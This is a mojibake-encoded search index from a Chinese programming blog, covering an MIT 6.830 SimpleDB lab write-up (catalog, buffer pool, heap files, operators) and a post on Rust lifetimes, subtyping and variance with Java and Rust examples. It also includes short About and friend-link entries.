æ—¥ä¸‹äº†å†³å¿ƒæŠŠå®ƒåšå®Œï¼Œæ¯å¤©åšä¸€ä¸ªlabï¼ŒåˆèŠ±äº†ä¸¤å¤©debugï¼Œé€šè¿‡æœ€éš¾çš„é‚£ä¸ªBTreeTestã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:1:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"SimpleDBæ¶æ„ SimpleDBä¸»è¦åŒ…å«ä¸‹åˆ—classï¼š è¡¨ç¤ºfieldï¼Œtupleï¼Œå’Œtuple schemaçš„ç±» å°†è°“è¯å’Œç­›é€‰æ¡ä»¶åº”ç”¨åˆ°tuplesä¸Šçš„ç±» ä¸€ä¸ªæˆ–å¤šä¸ªå°†relationä¿å­˜åœ¨diskä¸Šçš„æ–¹æ³•ï¼Œå¹¶æä¾›è¿­ä»£relationåŒ…å«çš„tuplesçš„æ–¹æ³• ä¸€ç³»åˆ—å¤„ç†tuplesçš„operatorï¼ˆå¦‚selectï¼Œjoinï¼Œinsertï¼Œdeleteç­‰ï¼‰ buffer poolï¼Œç”¨äºå°†æ´»è·ƒçš„pageæ¢å­˜åœ¨å†…å­˜ä¸­ï¼Œå¹¶è´Ÿè´£å¤„ç†å¹¶å‘æ§åˆ¶å’Œäº‹åŠ¡ catalogï¼Œä¿å­˜tableså’Œå®ƒä»¬schemaä¿¡æ¯ lab1ä¸­æ¶‰åŠçš„SimpleDBä¸»è¦æ¨¡å—å¦‚ä¸‹ï¼š ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:2:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"Exercises ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"1. Fields and Tuples TupleDescæ˜¯tableçš„schemaï¼Œæè¿°äº†Tableä¸­æ‰€æœ‰Tupleçš„æ ¼å¼ï¼ŒTupleç”±ä¸€åˆ°å¤šä¸ªFieldæ„æˆã€‚ å®ŒæˆTupleDescï¼ŒTupleã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:1","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"2. Catalog å…¨å±€Catalogæ˜¯Catalogç±»çš„ä¸€ä¸ªå•ä¾‹å¯¹è±¡ã€‚å­˜å‚¨ç€æ•°æ®åº“çš„å…ƒä¿¡æ¯ã€‚æ¯ä¸ªtableä¸ä¸€ä¸ªTupleDescå…³è”ï¼Œè®©operatorå¾—çŸ¥tableçš„schemaã€‚ ä¿®æ”¹Catalogç±»å®ç°æ·»åŠ æ–°è¡¨ã€è·å–ç‰¹å®šè¡¨çš„ä¿¡æ¯ã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:2","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"3. BufferPool å…¨å±€BufferPoolæ˜¯Catalogçš„ä¸€ä¸ªå•ä¾‹å¯¹è±¡ã€‚è´Ÿè´£ç®¡ç†ä»diskè¯»å–çš„Pageï¼Œæ‰€æœ‰operatoréƒ½è¦é€šè¿‡BufferPoolè¯»å†™diskä¸Šçš„Pageã€‚ BufferPoolä¸­æœ€å¤šä¿å­˜numPagesä¸ªPageã€‚é¦–å…ˆéœ€è¦å®ç°æœ€å…³é”®çš„BufferPool.getPage()æ–¹æ³•ï¼Œå¦‚æœPageå·²ç¼“å­˜ï¼Œåˆ™ç›´æ¥è¿”å›ï¼›å¦åˆ™ä»Catalogä¸­è·å–å¯¹åº”çš„æ•°æ®åº“æ–‡ä»¶ï¼Œè¯»å–Pageã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:3","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"4\u00265. HeapFile access method access methodæ˜¯ä»æŒ‰ç…§ç‰¹å®šæ ¼å¼ç»„ç»‡çš„diskæ–‡ä»¶ä¸­è¯»å–æ•°æ®åº“æ•°æ®çš„æ–¹æ³•ã€‚SimpleDBä¸­åŒ…å«HeapFileå’ŒB+Treeä¸¤ç§ã€‚å‰4ä¸ªlabä»…ä¸HeapFileç›¸å…³ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒHeapFileåˆ†æˆå¤šä¸ªHeapPageï¼Œæ¯ä¸ªPageå›ºå®šå¤§å°ï¼ŒåŒ…æ‹¬headerå’Œå¤šä¸ªTuple slotã€‚headerä¸­æœ‰ä¸€ä¸ªbitmapï¼Œç”¨æ¥è¡¨ç¤ºæŸä¸ªslotæ˜¯å¦è¢«ä½¿ç”¨ã€‚HeapPageIdç”¨æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªHeapPageï¼Œè®°å½•Pageæ‰€åœ¨è¡¨ï¼Œpageåºå·ã€‚RecordIdç”¨æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªtupleï¼Œè®°å½•äº†tupleæ‰€åœ¨çš„PageIdï¼Œå’Œtupleåºå·ã€‚ æœ¬å®éªŒéœ€è¦å®Œå–„HeapPageIdï¼ŒRecordIdï¼ŒHeapPageç±»ã€‚ BufferPool.getPage()æ–¹æ³•éœ€è¦è°ƒç”¨å…·ä½“çš„DbFileæ¥è¯»å–pageï¼Œæ‰€ä»¥è¦å®ç°HeapFileä¸­è¯»å–pageçš„æ–¹æ³•ã€‚æ­¤å¤–ï¼Œè¿˜è¦å®ç°HeapFile.iterator()æ–¹æ³•ï¼Œç”¨æ¥è¿­ä»£HeapFileä¸­æ‰€æœ‰pageåŒ…å«çš„Tupleã€‚æ³¨æ„ï¼šiterä¸­éœ€è¦ä½¿ç”¨BufferPool.getPage()æ¥è¯»å–pageï¼Œè¿™æ ·å¯¹æ•°æ®åº“çš„è®¿é—®æ‰èƒ½è¢«çº³å…¥ç®¡ç†ï¼› open() iteræ—¶ä¸è¦æŠŠæ‰€æœ‰pageéƒ½loadåˆ°å†…å­˜ï¼Œæµªè´¹å†…å­˜ã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:4","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"6. Operators SimpleDBä¸­çš„å¤šä¸ªoperatorsè´Ÿè´£query plançš„å®é™…æ‰§è¡Œï¼Œå®ƒä»¬å®ç°äº†å…³ç³»ä»£æ•°ä¸­çš„è¿ç®—ã€‚åœ¨SimpleDBä¸­ï¼Œoperatoræ˜¯åŸºäºiteratorçš„ï¼Œæ¯ä¸ªiteratoréƒ½å®ç°äº†DbIteratoræ¥å£ã€‚ å€Ÿç”¨CMU 15-445çš„slideï¼ŒSimpleDBæ‰§è¡Œqueryæ¨¡å‹å¦‚ä¸‹å›¾ã€‚ä¸€ä¸ªqueryè¢«ç»„ç»‡æˆoperatoræ ‘ï¼Œåº•å±‚operatorè¢«ä¼ é€’ç»™ä¸Šå±‚operatorçš„æ„é€ å™¨ã€‚æœ€åº•å±‚å¶å­ç»“ç‚¹ä»£è¡¨access methodï¼Œä»diskä¸­è¯»å–tupleï¼›é¡¶å±‚çš„operatoråªéœ€è¦ä¸æ–­è°ƒç”¨getNext()ï¼Œå³å¯è¾“å‡ºç¬¦åˆæ¡ä»¶çš„æŸ¥è¯¢ç»“æœã€‚é¡¶å±‚çš„getNext()è°ƒç”¨ä¼šä¸æ–­å‘ä¸‹ä¼ é€’ï¼Œç›´åˆ°access methodï¼Œç„¶åè¯»å–tupleå†å‘ä¸Šä¼ é€’ã€‚å¦‚æœqueryä¸­åªåŒ…å«ç®€å•çš„æ•°æ®ç­›é€‰ï¼Œå¦‚value \u003e 100ï¼Œé‚£ä¹ˆæ•´ä¸ªqueryæ ‘æ˜¯å¯ä»¥pipelineåŒ–çš„ï¼Œæ•°æ®è‡ªåº•å‘ä¸Šæºæºä¸æ–­çš„ä¼ é€’ï¼Œè¾“å‡ºï¼›ä½†æ˜¯é‡ä¸Šjoinè¿™ç§operatorï¼Œå°±éœ€è¦å…¶ä¸­ä¸€ä¸ªå­èŠ‚ç‚¹è¾“å‡ºæ‰€æœ‰tupleåæ‰èƒ½ç»§ç»­å‘ä¸Šä¼ é€’ã€‚ lab1ä¸­åªéœ€è¦å…ˆå®ç°ä¸€ä¸ªé¡ºåºæ‰«æçš„operatorï¼Œå®ƒé¡ºåºæ‰«ææŒ‡å®šçš„è¡¨ï¼Œè¯»å–æ‰€æœ‰tuplesã€‚åˆšå¥½å¯ä»¥åˆ©ç”¨ä¸Šé¢å®ç°çš„HeapFile.iterator()ã€‚ ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:5","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"åºŸæŸ´ç ”ç©¶ç”Ÿ@UCAS æ›¾åœ¨å¤§å‚å½“èºä¸é’‰å®ä¹ ç”Ÿï¼Œå†™è¿‡golangåç«¯ä»¥åŠrust sdkã€‚ç›®å‰å–œæ¬¢çœ‹çœ‹åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œç¢ç£¨Rustã€‚ ","date":"2021-12-23","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"å“²å®‡é…±: https://rinchannowww.github.io åœŸè±†å›: https://ipotato.me/ Qå“¥: https://qjx.app/ å­¦åˆ†: https://sprinter1999.github.io ğŸŸå¤§ä½¬: https://blog.name1e5s.com/ è¢å·¨å·¨: https://columbine21.github.io/ LeiWang1999: https://leiblog.wang clslaid: https://clslaid.icu/ ","date":"2021-12-22","objectID":"/friendlinks/:0:0","tags":null,"title":"å‹æƒ…é“¾æ¥","uri":"/friendlinks/"},{"categories":["rust"],"content":"æœ€è¿‘å¯¹ rust çš„ç”Ÿå‘½å‘¨æœŸæœ‰ä¸€äº›ç–‘æƒ‘ï¼Œåœ¨æ‰¾èµ„æ–™å­¦ä¹ çš„è¿‡ç¨‹ä¸­è‡ªç„¶å°±äº†è§£åˆ°ç”± rust ç”Ÿå‘½å‘¨æœŸå¯¼å‡ºçš„ rust subtypeã€variance çš„æ¦‚å¿µï¼Œå¯¹è¿™ä¸€å—å„¿çš„å­¦ä¹ ä¹Ÿè§£ç­”äº†æˆ‘ä¸€äº›å¯¹å…¶ä»–è¯­è¨€çš„é—®é¢˜,åŒæ—¶æˆ‘ä¹Ÿè¢«è®¤è¯†çš„å¤§ä½¬èµ¶é¸­å­ä¸Šæ¶,åœ¨ BUPT Rust Meetup åšäº†åˆ†äº«,keynote è®²ç¨¿åœ¨æ­¤ã€‚ ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:0:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"å­ç±»å‹ä¸å˜å½¢ å­ç±»å‹æ˜¯ç¨‹åºè¯­è¨€ç±»å‹ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ¦‚å¿µï¼ŒWikipedia å¯¹å…¶æœ‰å¦‚ä¸‹è§£é‡Šï¼š If S is a subtype of T, the subtyping relation is often written S \u003c: T, to mean that any term of type S can be safely used in a context where a term of type T is expected. è®¸å¤šè¯­è¨€çš„ç±»å‹ç³»ç»Ÿéƒ½æ”¯æŒå­ç±»å‹ï¼Œæœ€ç›´æ¥ã€æœ€ç†Ÿæ‚‰çš„åº”å½“å°±æ˜¯é¢å‘å¯¹è±¡ä¸­ç»§æ‰¿å…³ç³»å½¢æˆçš„å­ç±»å‹ã€‚ä¾‹å¦‚Catç±»ç»§æ‰¿äº†Animalç±»ï¼Œé‚£ä¹ˆCatæ˜¯Animalçš„å­ç±»å‹ï¼ˆCat \u003c: Animalï¼‰ï¼Œç›´è§‰ä¸Šå¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œä»»ä½•éœ€è¦Animalçš„è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨Catå»æ›¿æ¢ï¼Œè¿™ä¹Ÿæ˜¯é‡Œæ°æ›¿æ¢åŸåˆ™(Liskov substitution principle)ï¼š Let $q(x)$ be a property provable about $x$ of type T. Then $q(y)$ should be true for objects $y$ of type $S$ where $S$ is a subtype of T. ç»§æ‰¿å…³ç³»å¾ˆç›´æ¥å¯¼å‡ºäº†ä¸¤ä¸ªå…·ä½“ç±»å‹çš„ä¹‹é—´çš„å­ç±»å‹å…³ç³»ï¼Œå¯ç”±ç±»å‹æ„é€ å™¨äº§ç”Ÿçš„ä¸€äº›æ›´å¤æ‚çš„ç±»å‹ä¹‹é—´çš„å­ç±»å‹å…³ç³»å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿ F(T)ä¸ºç±»å‹æ„é€ å™¨ï¼ŒS \u003c: Tï¼Œ é‚£ä¹ˆF(S)å’ŒF(T)çš„æœ‰æ²¡æœ‰å­ç±»å‹å…³ç³»å‘¢?å¦‚æœæœ‰ï¼Œè°æ˜¯è°çš„å­ç±»å‹å‘¢ï¼Ÿå¤æ‚ç±»å‹ä¹‹é—´çš„å­ç±»å‹å…³ç³»å–å†³äºç±»å‹æ„é€ å™¨ï¼Œç›¸å¯¹äºåŸå§‹ç±»å‹ï¼Œå¯èƒ½æ˜¯ä¿æŒã€åè½¬æˆ–è€…æ— å…³ã€‚ å¦‚æœæ˜¯æ˜¯ä¿æŒï¼Œå³F(S) \u003c: F(T)ï¼Œåˆ™ç§°ä¹‹ä¸ºåå˜(covariant) å¦‚æœæ˜¯åè½¬ï¼Œå³F(T) \u003c: F(S)ï¼Œåˆ™ç§°ä¹‹ä¸ºé€†å˜(contravariant) å¦‚æœæ˜¯æ— å…³ï¼Œåˆ™ç§°ä¹‹ä¸ºä¸å˜/æŠ—å˜(invariant) covariantã€contravariantçš„æ¦‚å¿µæ¥è‡ªäºèŒƒç•´è®º(Category Theory)ä¸­çš„å‡½å­(Functor)ã€‚ ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:1:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"å˜å½¢ä¸ç±»å‹å®‰å…¨ åœ¨ä¸‹é¢çš„ Java ä»£ç ä¸­ï¼ŒCat[]èµ‹å€¼ç»™Animal[]ç±»å‹çš„å˜é‡å¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œä½†æ˜¯ArrayList\u003cCat\u003eèµ‹å€¼ç»™ArrayList\u003cAnimal\u003eç±»å‹çš„å˜é‡åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ã€‚è¯´æ˜ Java åœ¨ç¼–è¯‘æ—¶å¯¹æ•°ç»„é‡‡ç”¨äº†åå˜ï¼Œè€Œå¯¹æ³›å‹å®¹å™¨é‡‡ç”¨äº†æŠ—å˜ã€‚ä½†æ˜¯åœ¨è¿è¡Œæ—¶ï¼Œå¯¹æ•°ç»„å…ƒç´ è¿›è¡Œé”™è¯¯çš„èµ‹å€¼ï¼Œä¼šæŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ï¼Œè¿™å®é™…æ˜¯ä¸€ç§å¯¹äºç¼–è¯‘æœŸæ•°ç»„åå˜çš„è¡¥æ•‘ï¼Œæ•°ç»„é‡‡ç”¨åå˜æœ¬èº«æ˜¯ä¸€ç§å¾ˆå·®åŠ²çš„è®¾è®¡ã€‚ static class Animal { private int name; } static class Cat extends Animal { public Cat() { } public void meow() { System.out.println(\"meow\"); } } static class Dog extends Animal { public Dog() { } public void bark() { System.out.println(\"bark\"); } } public static void main(String[] args) throws Exception { // covariant, ok Animal[] animals = new Animal[10]; animals = new Cat[10]; // runtime error animals[0] = new Dog(); // invariant, compile error List\u003cAnimal\u003e listAnimals = new ArrayList\u003cAnimal\u003e(); listAnimals = new ArrayList\u003cCat\u003e(); } ç”±æ­¤å¯è§ï¼Œå¯¹äºæ”¯æŒå­ç±»å‹çš„è¯­è¨€ï¼Œå˜å½¢çš„è®¾è®¡æ˜¯éå¸¸é‡è¦ï¼Œå…¶ä¼šå½±å“ç¨‹åºçš„ç±»å‹å®‰å…¨ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ—¶å€™é‡‡ç”¨åå˜ï¼Œä»€ä¹ˆæ—¶å€™é‡‡ç”¨é€†å˜ï¼Œåˆåœ¨ä»€ä¹ˆæ—¶å€™é‡‡ç”¨æŠ—å˜å‘¢ï¼Ÿ æƒ³ä¸€ä¸‹è¿™æ ·ä¸€ä¸ªç¨‹åºï¼Œä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªç¬¼å­å‚æ•°ï¼Œç¬¼å­é‡Œé¢è£…ç€åŠ¨ç‰©ï¼Œä¸ç®¡ä¼ é€’çš„ç¬¼å­å‚æ•°ä¸­è£…ç€ä»€ä¹ˆåŠ¨ç‰©ï¼Œéƒ½å°†ç¬¼å­ä¸­çš„åŠ¨ç‰©æ›¿æ¢æˆä¸€åªç‹—ï¼Œè¿™æ ·åšçš„è¯ï¼Œå½“è°ƒç”¨å®Œå‡½æ•°åï¼Œå¤–éƒ¨ç¨‹åºç»§ç»­å°†ç¬¼å­ä¸­çš„åŠ¨ç‰©å½“ä½œåŸåŠ¨ç‰©æ¥å¯¹å¾…ï¼Œç±»å‹å®‰å…¨å°±å®Œè›‹äº†ã€‚ static class Cage\u003cT extends Animal\u003e { public T inner; public Cage(T a) { this.inner = a; } } static void evil_feed(Cage\u003cAnimal\u003e cage) { cage.inner = new Dog(); } public static void main(String[] args) throws Exception { Cage\u003cCat\u003e cage = new Cage\u003cCat\u003e(new Cat()); evil_feed(cage); cage.inner.meow(); } ä¸Šé¢çš„è¿™æ®µ Java ä»£ç å½“ç„¶æ˜¯æ— æ³•ç¼–è¯‘æˆåŠŸçš„ï¼Œå› ä¸º Java ä¸å¯¹æ³›å‹å®¹å™¨ä½¿ç”¨åå˜ã€‚ä½†æ˜¯ä¸èƒ½ä½¿ç”¨åå˜çš„ä¾æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯è¯»å†™æ“ä½œã€‚ å¦‚æœä¸€ä¸ªå®¹å™¨åªè¯»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå˜ï¼Œå°†ä¸€ä¸ªCage\u003cCat\u003eå½“ä½œCage\u003cAnimal\u003eè¯»å–ï¼Œä»»ä½•æ—¶å€™éƒ½ä¸ä¼šå‡ºé”™ï¼›å¦‚æœç±»å‹åªå†™ï¼Œé‚£ä¹ˆå‡½æ•°ä¸­çš„æ“ä½œåªèƒ½å¯¹å®¹å™¨å†…å®¹è¿›è¡Œå†™å…¥æˆ–è€…ä»€ä¹ˆéƒ½ä¸åšï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥è€ƒè™‘é€†å˜ï¼Œå³Cage\u003cAnimal\u003eæ˜¯Cage\u003cDog\u003eçš„å­ç±»å‹ï¼Œå¯¹äºä»»ä½•éœ€è¦Cage\u003cDog\u003eçš„å‡½æ•°ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä¼ å…¥Cage\u003cAnimal\u003eï¼Œå‡½æ•°åªä¼šå‘å…¶ä¸­å†™å…¥ä¸€åªDogï¼Œè€Œä¸å…³å¿ƒåŸæ¥æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”ç¨‹åºä¹Ÿæ°¸è¿œä¹Ÿä¸ä¼šå»è¯»Cageé‡Œçš„ä¸œè¥¿ï¼Œç¨‹åºè¯­è¨€ä¸­ï¼Œé€†å˜åŸºæœ¬ä¸å‡ºç°ï¼›å¦‚æœç±»å‹å¯è¯»å¯å†™ï¼Œé‚£ä¹ˆåªèƒ½æ˜¯æŠ—å˜ï¼Œè¦æ±‚ç±»å‹ä¸¥æ ¼ä¸€è‡´æ¥ä¿è¯ç±»å‹å®‰å…¨ã€‚ ç±»å‹æ„é€ å™¨å¯¼è‡´é€†å˜çš„æƒ…å†µéå¸¸å°‘ï¼Œä¸»è¦å‡ºç°åœ¨ä»¥å‡½æ•°ä½œä¸ºç±»å‹æ„é€ å™¨æ—¶ï¼š $$ F(U) \\rightarrow V $$ å¦‚ä¸Šçš„ä¸€å…ƒå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªUç±»å‹çš„å‚æ•°ï¼Œè¿”å›ä¸€ä¸ªVç±»å‹çš„å€¼ã€‚å¦‚æœæœ‰U \u003c: Tï¼Œé‚£ä¹ˆä»»ä½•éœ€è¦$F(U) \\rightarrow V$çš„åœ°æ–¹ï¼Œå¯ä»¥ä½¿ç”¨$F(T) \\rightarrow V$ä»£æ›¿ï¼Œè¿™å¾ˆç›´è§‚ï¼Œå› ä¸ºUæ˜¯Tçš„å­ç±»å‹ï¼Œæ‰€ä»¥ä¸€ä¸ªèƒ½å¤„ç† T ç±»å‹çš„å‡½æ•°å¿…ç„¶èƒ½å¤„ç† U ç±»å‹ï¼Œä¾‹å¦‚ä¸€ä¸ªèƒ½è®¡ç®—Animalå¹´é¾„çš„å‡½æ•°ä¸€å®šä¹Ÿèƒ½è®¡ç®—Catçš„å¹´é¾„ï¼Œæ‰€ä»¥æœ‰ï¼š $$ U \u003c: T \\Rightarrow F(T) \\rightarrow V \u003c: F(U) \\rightarrow V $$ å³æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªä½œç”¨åŸŸè¾ƒå¤§çš„å‡½æ•°ä»£æ›¿ä¸€ä¸ªä½œç”¨åŸŸè¾ƒå°çš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨æ—¶å®‰å…¨åœ°æ”¶ç¼©å®ƒçš„ä½œç”¨åŸŸè‡³å’Œåè€…ä¸€æ ·ï¼Œå³åªä½¿ç”¨Animalä¸­å±äºCatçš„é‚£ä¸€éƒ¨åˆ†ã€‚ ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:2:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"Rust ç”Ÿå‘½å‘¨æœŸ Rust æ²¡æœ‰ç±»å‹ç»§æ‰¿ï¼Œä½†æ˜¯ Rust æœ‰ lifetime å•Šï¼Œæ‰€ä»¥ Rust çš„å­ç±»å‹å¿…å®šæ˜¯æŒ‡ lifetime ä¹‹é—´çš„å…³ç³»ã€‚ åœ¨ Rust ä¸­ï¼Œ'a:'bæ„æ€æ˜¯'a outlives 'bï¼Œå³'aè¡¨ç¤ºçš„ç”Ÿå‘½å‘¨æœŸå¤§äºç­‰äº'bï¼Œä¹Ÿä»£è¡¨ç€'a \u003c: 'bã€‚ä¹ä¸€çœ‹æœ‰ç‚¹åç›´è§‰ï¼Œä½†ä¹Ÿå¾ˆå¥½ç†è§£ã€‚'a:'bä»£è¡¨'aè‡³å°‘å’Œ'bä¸€æ ·é•¿ï¼Œå³'aæ¯”'bæ›´åŠ ç‰¹åŒ–ï¼Œå°±åƒCatè‡³å°‘æ˜¯ç§Animalï¼ŒCatæ›´åŠ ç‰¹åŒ–ã€‚'staticå…³é”®å­—ä»£è¡¨é™æ€ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­æŒç»­å­˜åœ¨ï¼Œæ‰€ä»¥'staticæ˜¯ä»»æ„ç”Ÿå‘½å‘¨æœŸ'açš„å­ç±»å‹ã€‚ æˆ‘ä»¬ç»å¸¸ä¼šæ„Ÿå¹äº Rust ç¼–è¯‘å™¨çš„æ™ºèƒ½ï¼Œèƒ½å‡†ç¡®æ¨æ–­å‡ºç¨‹åºä¸­æŸä¸ªå¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸä¸å¤Ÿé•¿ã€ä¸åŒ¹é…ã€‚è¿™åŒæ—¶ä¹Ÿæ˜¯å­ç±»å‹å’Œå˜å½¢çš„åŠŸåŠ³ã€‚æ ¹æ®ä¸Šæ–‡è®¨è®ºçš„ç»“è®ºï¼ŒRust ç”Ÿå‘½å‘¨æœŸçš„å­ç±»å‹æœ‰å¦‚ä¸‹å˜å½¢è§„åˆ™ï¼š â€˜a T U * \u0026'a T covariant covariant * \u0026'a mut T covariant invariant * Box\u003cT\u003e covariant Vec\u003cT\u003e covariant * UnsafeCell\u003cT\u003e invariant Cell\u003cT\u003e invariant * fn(T) -\u003e U contravariant covariant *const T covariant *mut T invariant æˆ‘ä»¬çœ‹å¦‚ä¸‹è¿™ä¸ªä¾‹å­ï¼š fn evil_feeder\u003cT\u003e(input: \u0026mut T, val: T) { *input = val; } fn main() { let mut mr_snuggles: \u0026'static str = \"meow! :3\"; // mr. snuggles forever!! { let spike = String::from(\"bark! \u003e:V\"); let spike_str: \u0026str = \u0026spike; // Only lives for the block evil_feeder(\u0026mut mr_snuggles, spike_str); // EVIL! } println!(\"{}\", mr_snuggles); // Use after free? } ç¼–è¯‘ç»“æœï¼š æˆ‘ä»¬ä¸€çœ¼å°±èƒ½çœ‹å‡ºï¼Œspike_strçš„ lifetime å¤ªçŸ­äº†ï¼Œä¸å¯èƒ½å¤åˆ¶ç»™mr_snugglesï¼Œé‚£ä¹ˆç¼–è¯‘å™¨æ˜¯å¦‚ä½•æ¨æ–­çš„å‘¢ï¼Ÿ å› ä¸º\u0026mut Tæ˜¯å¯¹ T çš„ invariantï¼Œæ‰€ä»¥ç¼–è¯‘å™¨æ¨æ–­ T å¿…é¡»æ˜¯\u0026'static strï¼› spike_stræ˜¯ä¸€ä¸ª\u0026'a strï¼Œå¯¹'aæ˜¯ covariantï¼Œè¦åŒ¹é… Tï¼Œå¿…é¡»å°è¯•é€šè¿‡ covariant å˜å½¢æˆ'static strï¼› é‚£ä¹ˆç¼–è¯‘å™¨æ¨æ–­å‡º\u0026'a str:'\u0026'static strï¼Œä¹Ÿå³'a:'staticï¼Œè¿™å½“ç„¶æ— æ³•æˆç«‹ï¼Œå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ æ­¤å¤–ï¼Œå†çœ‹ä¸€ä¸ªæ›´æ˜æ˜¾çš„ä¾‹å­: // compile error fn invariant\u003c'a: 'b, 'b, 'c\u003e( sub: \u0026'c mut Vec\u003c\u0026'a String\u003e, sup: \u0026'c mut Vec\u003c\u0026'b String\u003e, ) -\u003e \u0026'c mut Vec\u003c\u0026'b String\u003e { sub } // compile ok fn covariant\u003c'a: 'b, 'b, 'c\u003e( sub: \u0026'c Vec\u003c\u0026'a String\u003e, sup: \u0026'c Vec\u003c\u0026'b String\u003e, ) -\u003e \u0026'c Vec\u003c\u0026'b String\u003e { sub } build ç»“æœå¦‚ä¸‹ï¼š åœ¨ä¸¤ä¸ªå‡½æ•°çš„æ³›å‹å‚æ•°ä¸­ï¼Œæ˜¾å¼æ ‡æ³¨äº†'a : 'bï¼› ç”±äº\u0026'a Tå¯¹'a covariantï¼Œæ‰€ä»¥\u0026'a String : \u0026'b Stringï¼› ç”±äºVec\u003cT\u003eå¯¹T covariantï¼Œæ‰€ä»¥Vec\u003c\u0026'a String\u003e : Vec\u003c\u0026'b String\u003eï¼› ç”±äº\u0026'a Tå¯¹ T æ˜¯ covariantï¼Œæ‰€ä»¥\u0026'c Vec\u003c\u0026'a String\u003e : \u0026'c Vec\u003c\u0026'b String\u003eï¼› æ‰€ä»¥åœ¨ covariant å‡½æ•°ä¸­ï¼Œå½“å‡½æ•°è¦æ±‚è¿”å›\u0026'c Vec\u003c\u0026'b String\u003eæ—¶ï¼Œå¯ä»¥ç›´æ¥è¿”å›\u0026'c Vec\u003c\u0026'a String\u003eï¼› ä½†æ˜¯\u0026'c mut Tå¯¹ T æ˜¯ invariantï¼Œ\u0026'c mut Vec\u003c\u0026'a String\u003eä¸``\u0026â€˜c mut Vec\u003c\u0026â€˜b String\u003e`é—´æ²¡æœ‰å­ç±»å‹å…³ç³»ï¼Œæ‰€ä»¥åœ¨ invariant å‡½æ•°ä¸­æ— æ³•å†è¿™ä¹ˆåšã€‚ æœ€åè¿˜æœ‰ä¸€ä¸ªä¾‹å­ï¼Œçœ‹çœ‹å‡½æ•°çš„é€†å˜ï¼š struct ContraVariant\u003cMixed\u003e { f: fn(Mixed), } fn test\u003c'a\u003e( a: \u0026mut ContraVariant\u003c\u0026'a i32\u003e, b: \u0026mut ContraVariant\u003c\u0026'static i32\u003e, f1: fn(\u0026'a i32), f2: fn(\u0026'static i32), ) { a.f = f1; a.f = f2; b.f = f1; b.f = f2; } fn main() { } build ç»“æœå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå››ä¸ªèµ‹å€¼è¯­å¥ä¸­ï¼Œåªæœ‰a.f = f2å¤±è´¥äº†ã€‚ fn(T)å¯¹T contravariantï¼Œ\u0026'static i32 : \u0026'a i32ï¼Œæ‰€ä»¥ fn(\u0026'a i32) : fn(\u0026'static i32)ï¼› a.fç±»å‹ä¸ºfn(\u0026'a i32)ï¼Œf2ç±»å‹ä¸ºfn(\u0026'static i32)ï¼› a.f = f2ï¼Œç›¸å½“äºæŠŠçˆ¶ç±»å‹å˜é‡èµ‹å€¼ç»™äº†å­ç±»å‹ï¼Œç±»å‹ä¸åŒ¹é…ï¼Œå¤±è´¥äº†ã€‚ 